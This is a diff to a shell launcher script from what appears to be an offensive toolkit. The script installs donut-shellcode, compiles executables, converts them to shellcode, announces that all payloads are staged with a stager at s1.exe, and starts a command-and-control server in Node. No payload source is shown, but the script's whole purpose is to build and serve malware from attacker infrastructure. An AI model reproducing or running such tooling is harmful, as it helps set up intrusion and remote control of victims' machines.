@@ -8,23 +8,37 @@
 
 
 cleanup() {
-echo "Cleaning up..."
-
-make -C src clean
-
-rm loader.bin
-#rm /shellcode/loaders/* -f
+echo -e "\n[+] Cleaning up...\n"
+make -s -C src clean
+rm loader.bin 2> /dev/null
+rm /shellcode/loaders/* -f 2> /dev/null
 }
 trap cleanup SIGINT
 
 
-echo -e "Checking Dependencies...\n"
-pip install -r requirements.txt
 
-make -C src "test"
 
+echo -e "[/] Checking Dependencies..."
+if pip3 show donut-shellcode | grep -q "not found"; then
+    pip3 install -r shellcode/requirements.txt
+fi
+if [ ! -d C2server/node_modules ]; then
+    cd C2server && npm install && cd ..
+fi
+echo -e "[+] Done!\n"
+
+echo -e "[/] Compiling executables..."
+make -s -C src "test"
+echo -e "[+] Done!\n"
+
+echo -e "[/] Generating shellcode..."
 python3 shellcode/exetoshellcode.py
+echo -e "[+] Done!\n"
 
+echo -e "[!] All payloads staged.\n"
+echo -e "[+] Stager can be found at $(pwd)/s1.exe\n"
+
+echo -e "[/] Starting C2 Server...\n"
 node C2server/server.js
 
 
